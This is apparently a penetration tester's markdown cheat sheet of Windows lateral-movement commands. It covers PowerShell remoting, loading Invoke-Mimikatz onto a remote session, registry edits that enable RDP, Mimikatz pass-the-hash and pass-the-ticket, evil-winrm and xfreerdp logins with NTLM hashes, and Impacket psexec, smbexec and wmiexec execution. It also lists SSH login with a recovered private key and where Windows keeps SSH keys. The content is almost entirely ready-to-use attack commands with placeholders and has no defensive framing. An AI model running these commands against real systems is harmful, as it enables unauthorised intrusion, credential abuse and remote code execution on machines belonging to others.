## Windows Server/Pro
```
Enter-PSsession {computer name}
New-PSSession {computer name}

# Active connection
$sess = New-PSSession -Computername {computer name}
Enter-Psession $sess

# Sent a comman to a computer runs whoami and hostname
Invoke-Command -ComputerName {computer name} -ScriptBlock{whoami;hostname}

# Loading powershell scripts onto remote shell
$sess = New-PSSession -Computername {computer name}
Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess
Enter-PSSession -Session $sess

# RDP (For GUI)
reg add "hklm\**system**\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
reg add "hklm\**system**\currentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f
```
## Mimikatz 
```
# PTH
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:{DOMAIN} /ntlm:{ntlmhash} /run:powershell.exe"'

Invoke-mimikatz -command '"kerberos::ptt {filepath}.kirbi"'
```
## Remote Access
```
# Evil WinRM
evil-winrm -i {IP} -u {username} -p {password/NTLM hash}

# Evil WinRM upload and Download
upload {local_filename} {destination_filename (optional)}
download {remote_filename} {destination_filename (optional)}

# RDP
xfreerdp /v:{IP address} /cert:ignore /u:{USERNAME}
xfreerdp /u:{USERNAME} /pth:{NTLM HASH} /v:{IP}

# For windows
telnet {IP}
```
## Impacket
```
# access the MSSQL
python3 mssqlclient.py {OPTIONAL HOSTNAME}/{USERNAME}@{IP} -windows-auth

# remote access using SMB via port 445
python3 smbexec.py {username}:{PASSWORD}@{IP}

# requires an administrator account to get NT/authority
python3 psexec.py {username}:{PASSWORD}@{IP}

# Executes a command to the target machine
python3 wmiexec.py {username}:{PASSWORD}@{IP} {COMMAND}
```
## SSH
```
ssh {username}:{Password}@{IP}

# SSH with plaintext SSH private key
nano key.txt 
chmod 600 key.txt
ssh -i key.txt {username}@{IP}

# Windows default SSH locations
C:\Users\%USERNAME%\id_rsa
C:\Users\%USERNAME%\id_rsa.pub
```

